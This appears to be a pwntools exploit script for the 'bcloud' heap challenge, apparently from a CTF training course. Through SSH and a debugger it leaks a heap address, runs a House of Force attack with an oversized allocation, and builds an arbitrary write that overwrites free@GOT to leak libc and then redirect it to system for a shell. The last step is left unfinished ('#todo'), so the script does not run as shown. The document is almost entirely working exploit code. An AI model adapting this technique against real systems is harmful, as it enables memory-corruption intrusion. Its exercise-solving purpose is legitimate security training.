from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']
ssh = ssh("acidburn", "192.168.56.103")
r = ssh.process("./bcloud") #env={'LD_PRELOAD': './libc-2.27.so'}
gdb.attach(r, """
	c
	""")

context.log_level = "debug"

# r = remote("training.jinblack.it", 2014)
input("wait")

def new_note(size, data):
	r.sendline(b"1")
	r.recvuntil(b"Input the length of the note content:\n")
	r.sendline(b"%d" % size) 
	r.recvuntil(b"Input the content:\n")
	r.send(data)
	if(len(data)<size):
		r.send(b"\n")
	r.recvuntil("--->>\n")

def edit(note_id, data):
	r.sendline(b"3")
	r.recvuntil(b'Input the id:\n')
	r.sendline(b"%d" % note_id)
	r.recvuntil(b'Input the new content:\n')
	r.sendline(data)
	r.recvuntil("--->>\n")


r.recvuntil(b"name:\n")

r.send(b"A"*0x40)
leak = u32(r.recvuntil("!")[:-1][-4:])
print("! 0x%08x" % leak)

r.recvuntil(b"Org:\n")
r.send(b"B"*0x40)
r.recvuntil(b"Host:\n")
r.send(b"\xff"*0x40)

top_chunk = leak + 0xf8
print("! top_chunk: 0x%08x" % top_chunk)

got = 0x0804b000
target = 0x0804b120

big_size = (target - top_chunk - 4) & 0xffffffff
print("! big_size: 0x%08x" % big_size)
print(b"%d" % u32(p32(big_size, signed=False), signed=True))


r.sendline(b"1")
r.recvuntil(b"Input the length of the note content:\n")
r.sendline(b"%d" % u32(p32(big_size, signed=False), signed=True) ) 
r.recvuntil(b"Input the content:\n")
r.sendline("A")
r.recvuntil("--->>\n")



puts_plt = 0x08048520
free_got = 0x0804b014

#return pointer to note_list + delta
new_note(50, "")

#set size of other notes
new_note(4, "")
new_note(4, "")
new_note(4, "")
new_note(4, "")


def arbitrary_write(address, data):
	edit(1,address)
	edit(4,data)

note_slot_5 = 0x804b134
read_got = 0x0804b00c

# edit(1,p32(free_got))
# #Overwrite free with puts
# edit(4,p32(puts_plt))
# edit(1,p32(slot_5))
# edit(4,p32(read_got))

arbitrary_write(p32(free_got), p32(puts_plt))
arbitrary_write(p32(note_slot_5), p32(read_got))


#delete note 5
r.sendline(b"4")
r.sendline(b"5")
r.recvuntil(b"id:\n")
read_libc = u32(r.recv(4))
r.recvuntil("--->>\n")
print("! read@libc 0x%04x" % read_libc)

system_libc = #todo
arbitrary_write(p32(free_got), p32(system_libc))

r.interactive()

